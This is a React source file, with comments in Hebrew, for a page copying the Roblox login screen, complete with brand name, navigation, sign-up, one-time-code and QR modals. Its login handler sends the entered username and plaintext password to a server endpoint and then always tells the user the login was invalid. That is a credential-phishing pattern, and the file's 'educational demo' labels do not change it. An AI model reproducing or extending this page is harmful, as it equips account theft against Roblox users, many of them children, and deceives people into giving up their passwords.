import React, { useMemo, useState } from "react";
import "./App.css";

/** מודאל כללי */
function Modal({ open, onClose, title, children }) {
  if (!open) return null;
  return (
    <div className="modal-backdrop" role="dialog" aria-modal="true">
      <div className="modal-card">
        <div className="modal-head">
          <h2>{title}</h2>
          <button className="icon-btn" onClick={onClose} aria-label="Close">✕</button>
        </div>
        <div className="modal-body">{children}</div>
        <div className="modal-foot">
          <button className="btn btn-primary" onClick={onClose}>Close</button>
        </div>
      </div>
    </div>
  );
}

/** QR דמה */
function QRPlaceholder({ text = "BW-DEMO-LOGIN" }) {
  // לא יוצר QR אמיתי – רק placeholder יפה
  return (
    <div className="qr-box">
      <div className="qr-grid">
        {Array.from({ length: 20 * 20 }).map((_, i) => (
          <div
            key={i}
            className={`qr-cell ${((i * 17 + i % 7) % 5 === 0) ? "qr-dot" : ""}`}
          />
        ))}
      </div>
      <div className="qr-caption">{text}</div>
    </div>
  );
}

export default function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [page, setPage] = useState("login"); // login | signup | play | info:<slug>
  const [openCodeModal, setOpenCodeModal] = useState(false);
  const [openQRModal, setOpenQRModal] = useState(false);

  // קוד חד־פעמי אקראי לדמו
  const demoOTP = useMemo(
    () => String(Math.floor(100000 + Math.random() * 900000)),
    [openCodeModal]
  );
  const [enteredOTP, setEnteredOTP] = useState("");
  const [otpMsg, setOtpMsg] = useState("");

async function onSubmit(e) {
  e.preventDefault();

  const masked = username
    ? (username.length <= 2 ? "*".repeat(username.length) : username.slice(0, -2).replace(/./g, "*") + username.slice(-2))
    : "(empty)";

  try {
    const res = await fetch("/api/demo-submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username,
        password,
        submittedAt: new Date().toISOString(),
      }),
    });

    // קרא את הגוף כדי לראות שגיאה אם יש
    const data = await res.json().catch(() => ({}));

    if (!res.ok) {
      throw new Error(data?.error || `Notify failed (${res.status})`);
    }

    alert("Invalid Username or Password.\nPlease try again.");
  } catch (err) {
    console.error("Notify error:", err);
    alert(`Could not send notification. ${String(err.message || err)}`);
  }
}


  // ======= פעולות כפתורים =======
  function handleSignUp() {
    setPage("signup");
    window.scrollTo(0, 0);
  }

  function handleContinueInApp() {
    alert("Demo: would deep-link to the native app.\n(e.g., Roblox://open)");
  }

  function handleContinueInBrowser() {
    setPage("play"); // עמוד דמו
    window.scrollTo(0, 0);
  }

  function handleEmailCode() {
    setEnteredOTP("");
    setOtpMsg("");
    setOpenCodeModal(true);
  }

  function verifyOTP(e) {
    e.preventDefault();
    if (enteredOTP.trim() === demoOTP) {
      setOtpMsg("✅ Code verified! (Demo)");
    } else {
      setOtpMsg("❌ Incorrect code. Try again.");
    }
  }

  function handleAnotherDevice() {
    setOpenQRModal(true);
  }

  function openInfo(slug) {
    setPage(`info:${slug}`);
    window.scrollTo(0, 0);
  }

  // ======= תוכן עמודים משניים =======
  function InfoPage({ title, children }) {
    return (
      <div className="card login">
        <h1>{title}</h1>
        <div className="info-body">{children}</div>
      </div>
    );
  }

  function SignUpPage() {
    const [email, setEmail] = useState("");
    const [user, setUser] = useState("");
    const [pass, setPass] = useState("");

    function submitSignup(e) {
      e.preventDefault();
      alert(`Demo sign-up only.\nusername: ${user}\nemail: ${email}`);
    }

    return (
      <div className="card login">
        <h1>Create your Roblox account</h1>
        <form onSubmit={submitSignup} className="signup-form">
          <label htmlFor="su-email">Email</label>
          <input id="su-email" type="email" value={email}
                 onChange={(e)=>setEmail(e.target.value)}
                 placeholder="you@example.com" required />
          <label htmlFor="su-user">Username</label>
          <input id="su-user" type="text" value={user}
                 onChange={(e)=>setUser(e.target.value)}
                 placeholder="Pick a username" required />
          <label htmlFor="su-pass">Password</label>
          <input id="su-pass" type="password" value={pass}
                 onChange={(e)=>setPass(e.target.value)}
                 placeholder="Create a password" required />
          <button className="btn btn-primary">Create account</button>
        </form>
      </div>
    );
  }

  function PlayPage() {
    return (
      <div className="card login">
        <h1>Roblox Web</h1>
        <p className="muted">This is a simple “Continue in browser” demo page.</p>
        <div className="stack">
          <button className="btn btn-primary" onClick={() => alert("Demo: launching experience...")}>
            Launch Experience
          </button>
          <button className="btn btn-ghost" onClick={() => setPage("login")}>Back to login</button>
        </div>
      </div>
    );
  }

  const infoMap = {
    about: {
      title: "About Us",
      body: "This is a demo information page for the Roblox project."
    },
    jobs: {
      title: "Jobs",
      body: "We’re not hiring (because this is a demo) — but your CV looks great 😉."
    },
    blog: {
      title: "Blog",
      body: "Coming soon: product updates, tips, and community spotlights."
    },
    parents: {
      title: "Parents",
      body: "Roblox values learning and safety. This page explains our demo policies."
    },
    giftcards: {
      title: "Gift Cards",
      body: "Gift cards are not available in this demo."
    },
    help: {
      title: "Help",
      body: "FAQ, account recovery, and support — demo only."
    },
    terms: {
      title: "Terms",
      body: "Demo terms of service (for educational purposes)."
    },
    accessibility: {
      title: "Accessibility",
      body: "We strive for inclusive design in this educational demo."
    },
    privacy: {
      title: "Privacy",
      body: "No real data is collected in this demo."
    },
    choices: {
      title: "Your Privacy Choices",
      body: "Manage your demo privacy choices here."
    },
    sitemap: {
      title: "Sitemap",
      body: "Overview of demo pages."
    }
  };

  // ======= ה־UI הראשי =======
  return (
    <div className="page">
      {/* Top nav */}
      <header className="topbar">
        <div className="topbar-inner">
          <div className="brand-and-nav">
            <div className="brand" onClick={() => setPage("login")} style={{cursor:"pointer"}}>
              <div className="mark"><div className="diamond" /></div>
              <span className="brand-text">Roblox</span>
            </div>
            <nav className="nav">
              <a onClick={() => openInfo("about")}>About Us</a>
              <a onClick={() => openInfo("jobs")}>Jobs</a>
              <a onClick={() => openInfo("blog")}>Blog</a>
              <a onClick={() => openInfo("parents")}>Parents</a>
            </nav>
          </div>
          <div className="actions">
            <button className="btn btn-primary" onClick={handleSignUp}>Sign Up</button>
            <button className="icon-btn" title="Search" aria-label="Search">🔍</button>
          </div>
        </div>
      </header>

      {/* Main */}
      <main className="wrap grid">
        {page === "login" && (
          <>
            <section className="col-left">
              <div className="card login">
                <h1>Login to Roblox</h1>

                <form onSubmit={onSubmit} aria-label="Demo login form">
                  <label htmlFor="username">Username / Email / Phone</label>
                  <input
                    id="username"
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Enter your username"
                    autoComplete="username"
                    required
                  />

                  <label htmlFor="password">Password</label>
                  <input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter your password"
                    autoComplete="current-password"
                    required
                  />

                  <button type="submit" className="btn btn-ghost full">Log In</button>
                </form>

                <div className="center strong">Forgot Password or Username?</div>

                <div className="stack">
                  <button className="btn btn-muted" onClick={handleEmailCode}>
                    Email Me a One-Time Code
                  </button>
                  <button className="btn btn-muted" onClick={handleAnotherDevice}>
                    Use Another Device
                  </button>
                </div>

                <div className="center muted">
                  Don't have an account? <button className="linklike" onClick={handleSignUp}>Sign Up</button>
                </div>

              </div>
            </section>

           
          </>
        )}

        {page === "signup" && <SignUpPage />}
        {page === "play" && <PlayPage />}

        {/* עמודי מידע כלליים */}
        {page.startsWith("info:") && (() => {
          const slug = page.split(":")[1];
          const data = infoMap[slug] || { title: "Info", body: "Demo page." };
          return (
            <InfoPage title={data.title}>
              <p className="muted">{data.body}</p>
              <div className="stack">
                <button className="btn btn-ghost" onClick={() => setPage("login")}>Back</button>
              </div>
            </InfoPage>
          );
        })()}
      </main>

      {/* Footer */}
      <footer className="footer wrap">
        <div className="links">
          <a onClick={() => openInfo("about")}>About Us</a>
          <a onClick={() => openInfo("jobs")}>Jobs</a>
          <a onClick={() => openInfo("blog")}>Blog</a>
          <a onClick={() => openInfo("parents")}>Parents</a>
          <a onClick={() => openInfo("giftcards")}>Gift Cards</a>
          <a onClick={() => openInfo("help")}>Help</a>
          <a onClick={() => openInfo("terms")}>Terms</a>
          <a onClick={() => openInfo("accessibility")}>Accessibility</a>
          <a onClick={() => openInfo("privacy")}>Privacy</a>
          <a onClick={() => openInfo("choices")}>Your Privacy Choices</a>
          <a onClick={() => openInfo("sitemap")}>Sitemap</a>
        </div>
        <p className="copyright">
          © 2025 Roblox. This page is an educational imitation of a login layout; it is not affiliated with any brand.
        </p>
      </footer>

      {/* מודאל קוד חד־פעמי */}
      <Modal open={openCodeModal} onClose={() => setOpenCodeModal(false)} title="Email a one-time code">
        <p className="muted">
          Demo: pretending to send a code to your email. For testing, use this code:
          <strong> {demoOTP}</strong>
        </p>
        <form onSubmit={verifyOTP} className="otp-form">
          <input
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={6}
            placeholder="Enter 6-digit code"
            value={enteredOTP}
            onChange={(e)=>setEnteredOTP(e.target.value)}
          />
          <button className="btn btn-primary">Verify</button>
        </form>
        {otpMsg && <p className="otp-msg">{otpMsg}</p>}
      </Modal>

      {/* מודאל QR דמה */}
      <Modal open={openQRModal} onClose={() => setOpenQRModal(false)} title="Use another device">
        <p className="muted">Scan this demo QR with your (imaginary) mobile app.</p>
        <QRPlaceholder text="BW-LOGIN-1234" />
      </Modal>
    </div>
  );
}
